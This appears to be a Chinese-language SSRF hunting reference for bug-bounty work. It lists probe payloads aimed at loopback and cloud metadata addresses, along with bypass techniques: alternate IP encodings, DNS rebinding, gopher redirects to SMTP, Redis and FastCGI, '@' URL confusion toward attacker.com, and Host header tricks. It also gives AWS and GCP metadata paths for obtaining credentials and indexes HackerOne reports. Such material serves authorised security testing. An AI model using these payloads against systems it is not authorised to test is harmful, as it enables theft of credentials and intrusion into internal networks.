# hunt-ssrf · 参考

按 hunt 阶段当前入口类型定向查阅。每个绕过族附真实 HackerOne 报告，便于对照复现细节。
（真实报告来源：本仓库第二轮筛选出的 SSRF 高价值案例，value_score≥8。）

## Payloads（基础探测）

先用带外回连确认"服务端真的发了请求"，再谈绕过。把 `<OAST>` 换成你自己的 Collaborator/interactsh 域名。

```
http://<OAST>/                     # 基础带外确认
http://<OAST>:80/ping
http://127.0.0.1/                  # loopback
http://localhost/
http://169.254.169.254/            # 云元数据（AWS/GCP/Azure 通用入口）
http://[::1]/                      # IPv6 loopback
http://[::]:25/                    # IPv6 未指定地址 → 内部 SMTP
```

## Bypasses（绕过手法族）

### A. IPv6 / 备用地址表示绕过 IPv4 黑名单
黑名单常只覆盖 IPv4 文本，换 IPv6 或映射写法即可绕过。
- `http://[::]:<port>/`、`http://[::1]/`、`http://[::ffff:127.0.0.1]/`
- IPv4-mapped 去前导零回退：`[::ffff:0127.000.0.1]` → `127.0.0.1`
- 真实：#61312（`[::]` 绕过 IPv4 黑名单打内部 SMTP）。

### B. 备用 IP 编码 / 让解析器"返回空"
畸形/非十进制 IP 使校验侧解析失败（返回空、当作合法），请求侧仍解析为内网。
- 十进制整数、八进制、十六进制：`2130706433` / `0177.0.0.1` / `0x7f.0.0.1`
- 短写：`127.1`、`127.0.1`
- 真实：#287245、#287835（Ruby `Resolv::getaddresses` 对 `127.1`/八进制返回空，绕黑名单）。

### C. DNS rebinding / TOCTOU（校验与请求解析不一致）
自建 DNS 对同一域名先返回合法 IP（过校验）、后返回内网 IP（发请求）。
- 用轮换 A 记录或 rebind 服务（如 `rbndr`、自建）。
- 真实：#541169（GitLab UrlBlocker rebinding 绕过）、#53004（回调 URL 黑名单 rebinding）、#530974（rebind 到 `169.254.169.254` 取元数据）。

### D. 重定向 + 协议切换
目标校验入口 URL 但**跟随重定向**，用 30x 跳到内网或非 HTTP 协议。
- 30x → `http://169.254.169.254/`、`gopher://`、`ftp://`、`dict://`、`tftp://`
- `gopher://` 可构造任意 TCP：打 SMTP/Redis/FastCGI。
- `#` 截断、302 把 POST 转 GET、CRLF 注入拼完整请求。
- 真实：#228377、#115748（gopher 发 SMTP）、#446593、#895696、#1354335（gopher→FastCGI RCE）、#776017（`#`截断+302+CRLF）。

### E. URL 解析歧义 / Host 头信任
利用 `@`、`X-Forwarded-Host`、反代对 Host 的信任，把请求导到攻击者或内网。
- `http://expected.com@attacker.com/`、`http://attacker.com#@expected.com/`
- 加 `X-Forwarded-Host: internal` / 篡改 `Host`
- 真实：#713900（`@` 绕白名单）、#727330 与 #429617（`X-Forwarded-Host`/Host 信任泄露内部头与令牌）、#878779（URL 解码+开放重定向链，Full-Read SSRF）。

### F. 云元数据专项
拿到 SSRF 后优先打元数据换凭据。
- AWS：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`（注意 IMDSv2 需 PUT 取 token）。
- GCP：`http://metadata.google.internal/computeMetadata/v1beta1/...`（`v1beta1` 历史上无需 `Metadata-Flavor` 头）。
- 真实：#341876（GCP v1beta1 无头→kube-env→接管 K8s→RCE）、#401136、#978823（→IAM 凭据）。

### G. 媒体/文件解析器触发的 SSRF
"抓视频/转封面/生成 PDF"类功能常由 FFmpeg/ImageMagick/headless Chrome 解析，可被playlist/外链诱导发内部请求或读本地文件。
- FFmpeg：伪装 AVI/`m3u8`/HLS 播放列表指向内部或 `file://`。
- 真实：#237381、#115978（FFmpeg HLS → SSRF + 本地文件读取）。

### H. 协议信任细节
- FTP PASV：`CURLOPT_FTP_SKIP_PASV_IP` 默认关时，FTP 服务器可用 PASV 响应指定内网 IP 做端口探测（#1040166 / CVE-2020-8284）。
- 库自动携带 Cookie：SSRF 请求带出内部会话（#1166943）。

## Detection Patterns（怎么判命中，而非猜）

- **带外命中**：OAST 收到 DNS/HTTP 回连 = 服务端确实发了请求（最硬信号）。
- **响应差异**：内网存活/端口开放 vs 关闭，返回状态码/长度/报错不同 → 盲 SSRF 端口扫描（#16571）。
- **时间差异**：可达 IP 快速 RST vs 不可达超时挂起 → 半盲判活。
- **回显**：Full-Read SSRF 直接把内部响应回显（#878779 类）。
- **元数据指纹**：响应里出现 `ami-id`/`iam`/`computeMetadata`/`kube-env` = 命中云元数据。

## Real Reports（复现索引）

| 手法族 | 报告 | 要点 |
|---|---|---|
| IPv6 | 61312 | `[::]` 绕 IPv4 黑名单打 SMTP |
| 备用编码 | 287245 / 287835 | Resolv 对畸形 IP 返回空 |
| DNS rebinding | 541169 / 53004 / 530974 | 校验/请求解析不一致 |
| 重定向+协议 | 115748 / 895696 / 1354335 / 776017 | gopher/FastCGI/CRLF |
| Host/@ | 713900 / 727330 / 429617 | 白名单与反代信任 |
| 云元数据 | 341876 / 401136 / 978823 | 取 IAM/kube-env 凭据 |
| 媒体解析 | 237381 / 115978 | FFmpeg HLS |
| 协议细节 | 1040166 / 1166943 | FTP PASV / 带 Cookie |
| Full-Read | 878779 | URL 解码+开放重定向回显 |

在 hunt 阶段：先 A/B 快速探黑名单强度，命中内网后立刻走 F 打元数据；入口是"抓媒体/生成截图"优先 G；入口跟随重定向优先 D。

## 更多真实案例（第三轮单例补充）

（来自第二轮单例、第三轮语义路由归入本类；仅列此前未收录的报告，作案例索引）

- **SSRF**
  - #843256 TURN 协议 peer 访问控制缺失导致 SSRF
  - #826361 CarrierWave remote_attachment_url 属性导致 SSRF
  - #392859 gopher 协议 + 302 重定向绕过 SSRF 黑名单
  - #855276 git config URL注入实现SSRF
  - #326040 插件功能滥用导致 SSRF 访问云元数据
  - #1608039 云元数据服务地址遗漏
  - #809248 信任边界内组件不可信导致 SSRF
  - #333419 TURN 服务器允许代理到内网导致 SSRF
- **SSRF绕过**
  - #632101 DNS 重绑定绕过 SSRF 防护（DNS 解析失败时跳过 IP 检查）
  - #925527 SSRF 绕过：DNS rebinding 和未检查 IP 范围（0.0.0.0, 169.254.0.0/16）
  - #369451 CI 运行状态差异导致 SSRF 防护绕过
  - #187520 利用重定向绕过SSRF的IP/端口过滤并支持basic-auth
- **curl 行为利用**
  - #2148242 curl duphandle 隐式加载 'none' 文件导致 cookie 注入
  - #1526328 curl 连接复用时不检查 SASL 参数导致 OAUTH2 绕过
  - #1560324 curl cookie 覆盖规则缺陷导致会话固定
- **框架行为利用**
  - #2408074 undici 跨域重定向未清除 Proxy-Authorization 头
  - #1141623 V8引擎对非法八进制字面量的宽容处理导致SSRF/LFI
- **协议绕过**
  - #824802 URN 请求绕过 ACL 检查
- **客户端 SSRF**
  - #1054382 客户端 SSRF：Burp Suite 自动解析 HTML 导致隐藏请求泄露 NetNTLM 哈希
- **协议注入**
  - #441090 CRLF 注入与 SSRF：git:// 协议绕过防护并注入 Redis 实现 RCE
- **内部重定向**
  - #1027873 利用X-Accel-Redirect头进行内部重定向
- **URL过滤绕过**
  - #1566462 curl globbing 功能绕过 URL 过滤
- **URL解析绕过**
  - #726117 curl URL解析器fragment混淆导致路径绕过
- **协议参数解析**
  - #2384833 curl --proto -all 参数解析缺陷导致协议未禁用
- **DNS重绑定**
  - #1710652 无效八进制 IP 解析差异导致 DNS rebinding 绕过
- **DNS劫持**
  - #218088 DNS SRV 记录验证缺陷导致请求劫持
- **IP解析差异**
  - #44513 IP解析差异绕过（IPv6变体）
- **协议行为利用**
  - #2429894 libuv域名解析漏洞导致SSRF
- **过滤器绕过**
  - #1115139 HTML过滤器绕过（<svg><style><h1/>前缀）导致SSRF
- **路径遍历**
  - #1132378 open-uri误用导致任意文件读取和SSRF
